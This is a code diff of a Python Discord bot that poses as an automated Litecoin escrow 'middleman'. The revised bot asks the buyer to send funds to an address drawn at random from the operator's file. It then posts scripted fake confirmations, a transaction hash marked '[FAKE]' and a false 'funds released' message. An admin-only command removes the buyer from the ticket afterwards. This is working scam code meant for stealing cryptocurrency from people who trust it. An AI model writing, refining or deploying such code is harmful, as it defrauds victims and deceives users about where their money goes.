@@ -1,9 +1,10 @@
 import discord
 from discord.ext import commands
-from discord.ui import View, Button
+from discord.utils import get
 import random
 import string
 import json
+import asyncio
 
 # Load config
 with open("config.json") as f:
@@ -11,139 +12,132 @@ with open("config.json") as f:
 
 TOKEN = config["token"]
 CATEGORY_ID = config["category_id"]
+ADMIN_IDS = config["admin_ids"]
+PREFIX = config["prefix"]
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=commands.when_mentioned_or("!"), intents=intents)
+bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-def generate_random_id(length=36):
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
+active_tickets = {}
 
-def get_litecoin_address():
-    try:
-        with open("ltcaddy.txt", "r") as f:
-            addresses = [line.strip() for line in f if line.strip()]
-        return random.choice(addresses)
-    except Exception:
-        return "No LTC address available"
+def get_random_ltc_address():
+    with open("ltcaddy.txt", "r") as f:
+        addresses = [line.strip() for line in f if line.strip()]
+    return random.choice(addresses)
 
 @bot.event
 async def on_ready():
-    print(f"Bot is ready as {bot.user}")
-
-# Track ticket session state
-ticket_sessions = {}
+    print(f"Logged in as {bot.user}.")
 
 @bot.event
 async def on_guild_channel_create(channel):
     if isinstance(channel, discord.TextChannel) and channel.category_id == CATEGORY_ID:
-        await handle_new_ticket_channel(channel)
-
-async def handle_new_ticket_channel(channel):
-    random_code = generate_random_id()
-    await channel.send(random_code)
-
-    embed = discord.Embed(
-        description="Please send the **Developer ID** of the user you are dealing with.\nType `cancel` to cancel the deal.",
-        color=discord.Color.blue()
-    )
-    await channel.send(embed=embed)
-    ticket_sessions[channel.id] = {"awaiting_dev_id": True}
+        await asyncio.sleep(1)
+        fake_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        await channel.send(f"Please provide the **Developer ID** to add to the ticket. Ticket ID: `{fake_id}`")
+        active_tickets[channel.id] = {"buyer_id": None, "developer_added": False, "deal_amount": None}
 
 @bot.event
 async def on_message(message):
-    if message.author.bot:
+    if message.author == bot.user:
         return
 
-    if message.channel.id in ticket_sessions and ticket_sessions[message.channel.id]["awaiting_dev_id"]:
-        try:
-            dev_id = int(message.content.strip())
-            guild = message.guild
-            dev_user = await bot.fetch_user(dev_id)
-            await message.channel.set_permissions(dev_user, read_messages=True, send_messages=True)
+    channel = message.channel
+    if isinstance(channel, discord.TextChannel) and channel.category_id == CATEGORY_ID:
 
-            await send_middleman_embeds(message.channel, message.author.mention, dev_user)
-            ticket_sessions[message.channel.id]["awaiting_dev_id"] = False
-        except Exception:
-            await message.channel.send(embed=discord.Embed(description="❌ Invalid Developer ID.", color=discord.Color.red()))
-        return
+        data = active_tickets.get(channel.id)
+
+        # Step 1: Add developer
+        if data and not data["developer_added"] and message.content.isdigit():
+            try:
+                dev = await bot.fetch_user(int(message.content))
+                await channel.set_permissions(dev, read_messages=True, send_messages=True)
+                await channel.send(f"{dev.mention} has been added to the ticket.")
+                data["developer_added"] = True
+                data["buyer_id"] = message.author.id
+                await send_instruction_embeds(channel)
+                return
+            except:
+                await channel.send("Invalid Developer ID.")
+
+        # Step 2: Accept deal amount (only from buyer)
+        if data and data["developer_added"] and data["deal_amount"] is None:
+            if message.author.id == data["buyer_id"]:
+                try:
+                    amount = float(message.content.strip())
+                    data["deal_amount"] = amount
+                    await channel.send(f"✅ Deal amount of **${amount}** has been noted.")
+                    await fake_ltc_payment_flow(channel, amount)
+                except:
+                    await channel.send("❌ Invalid amount. Please enter a valid number (e.g., 5.5).")
 
     await bot.process_commands(message)
 
-class RoleSelectView(View):
-    def __init__(self, msg):
-        super().__init__(timeout=None)
-        self.msg = msg
-        self.buyer = None
-        self.seller = None
+async def send_instruction_embeds(channel):
+    embeds = []
 
-    @discord.ui.button(label="Sending", style=discord.ButtonStyle.blurple)
-    async def sending(self, interaction: discord.Interaction, button: Button):
-        self.buyer = interaction.user
-        await self.update_message(interaction)
-
-    @discord.ui.button(label="Receiving", style=discord.ButtonStyle.green)
-    async def receiving(self, interaction: discord.Interaction, button: Button):
-        self.seller = interaction.user
-        await self.update_message(interaction)
-
-    @discord.ui.button(label="Reset", style=discord.ButtonStyle.danger)
-    async def reset(self, interaction: discord.Interaction, button: Button):
-        self.buyer = None
-        self.seller = None
-        await self.update_message(interaction)
-
-    async def update_message(self, interaction, reset=False):
-        embed = discord.Embed(
-            title="Role Selection",
-            description=(
-                "Please select one of the following buttons that corresponds to your role in this deal. "
-                "Once selected, both users must confirm to proceed.\n\n"
-                f"**Sending Litecoin ( Buyer )**\n{self.buyer.mention if self.buyer else 'None'}\n\n"
-                f"**Receiving Litecoin ( Seller )**\n{self.seller.mention if self.seller else 'None'}"
-            ),
-            color=discord.Color.dark_gold()
-        )
-        await self.msg.edit(embed=embed, view=self)
-        await interaction.response.defer()
-
-async def send_middleman_embeds(channel, author_mention, dev_user):
     embed1 = discord.Embed(
-        description=f"{author_mention} added {dev_user.mention} to the ticket!",
-        color=discord.Color.blurple()
+        title="👤 Provide Developer ID",
+        description="Give the correct user ID with whom you are dealing. Don’t give the username.",
+        color=0x3498db
     )
-    await channel.send(embed=embed1)
+    embed1.add_field(name="Example:", value="`123456789012345678`", inline=False)
+    embeds.append(embed1)
 
     embed2 = discord.Embed(
-        title="Crypto MM",
-        description=(
-            "Welcome to our automated cryptocurrency Middleman system! Your cryptocurrency will be stored securely "
-            "till the deal is completed. The system ensures the security of both users, by securely storing the funds "
-            "until the deal is complete and confirmed by both parties."
-        ),
-        color=discord.Color.blue()
+        title="📝 ToS and Warranty",
+        description="Please deal inside ticket, confirm your deal and warranty here. Don't delete messages.",
+        color=0xe67e22
     )
-    embed2.set_footer(text="Created by: Exploit")
-    await channel.send(embed=embed2)
+    embeds.append(embed2)
 
     embed3 = discord.Embed(
-        title="Please Read!",
-        description=(
-            "Please check deal info, confirm your deal and discuss about TOS and warranty of that product. "
-            "Ensure all conversations related to the deal are done within this ticket. Failure to do so may put you at risk."
-        ),
-        color=discord.Color.red()
+        title="✅ Role Selection",
+        description="Please confirm who's sending and who's receiving funds:",
+        color=0x2ecc71
     )
-    await channel.send(embed=embed3)
+    embed3.add_field(name="Click buttons below:", value="Buyer | Seller", inline=False)
+    embeds.append(embed3)
 
     embed4 = discord.Embed(
-        title="Role Selection",
-        description=(
-            "Please select one of the following buttons that corresponds to your role in this deal. Once selected, "
-            "both users must confirm to proceed.\n\n**Sending Litecoin ( Buyer )**\nNone\n\n**Receiving Litecoin ( Seller )**\nNone"
-        ),
-        color=discord.Color.dark_gold()
+        title="💵 Enter Deal Amount",
+        description="Please enter the deal amount in $ (e.g., `5.00`). Don’t include symbols.",
+        color=0xf1c40f
     )
-    msg = await channel.send(embed=embed4)
-    await msg.edit(view=RoleSelectView(msg))
+    embeds.append(embed4)
+
+    for embed in embeds:
+        await channel.send(embed=embed)
+
+async def fake_ltc_payment_flow(channel, amount):
+    ltc_address = get_random_ltc_address()
+    await asyncio.sleep(1)
+    await channel.send(
+        f"Please send **${amount}** worth of **LTC** to the following address:\n```{ltc_address}```"
+    )
+    await asyncio.sleep(2)
+    await channel.send("⏳ Waiting for fake confirmation...")
+
+    await asyncio.sleep(4)
+    await channel.send("✅ **Funds received successfully**. Both parties may proceed with the deal.")
+
+    await asyncio.sleep(2)
+    await channel.send("🧾 *[FAKE]* LTC Transaction Hash: `b6f699d22a1234ffedbc9ab0ed1e...`")
+    await asyncio.sleep(2)
+    await channel.send("🎉 Buyer clicked release. Funds released to seller.")
+
+@bot.command()
+async def end(ctx):
+    if ctx.author.id not in ADMIN_IDS:
+        return await ctx.send("❌ You don't have permission to use this command.")
+
+    data = active_tickets.get(ctx.channel.id)
+    if data and data["buyer_id"]:
+        member = ctx.guild.get_member(data["buyer_id"])
+        if member:
+            await ctx.channel.set_permissions(member, overwrite=None)
+            await ctx.send(f"🛑 Buyer {member.mention} has been removed from the ticket.")
+    else:
+        await ctx.send("❌ No buyer found in this ticket.")
 
 bot.run(TOKEN)
